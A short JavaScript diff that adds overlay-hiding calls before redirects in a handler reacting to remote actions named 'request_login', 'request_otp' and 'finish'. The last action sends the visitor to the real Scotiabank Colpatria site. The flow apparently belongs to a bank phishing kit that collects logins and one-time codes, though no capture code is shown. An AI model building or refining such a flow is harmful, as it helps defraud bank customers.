@@ -75,6 +75,7 @@ document.addEventListener('DOMContentLoaded', () => {
         switch(data.action) {
             case 'request_login':
                 console.log('🔐 Redirigiendo a index.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'index.html';
                 break;
             case 'request_otp':
@@ -86,6 +87,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'finish':
                 console.log('✅ Finalizando - redirigiendo a scotiabankcolpatria.com');
+                BancoUtils.hideOverlay();
                 window.location.href = 'https://www.scotiabankcolpatria.com/';
                 break;
             default:
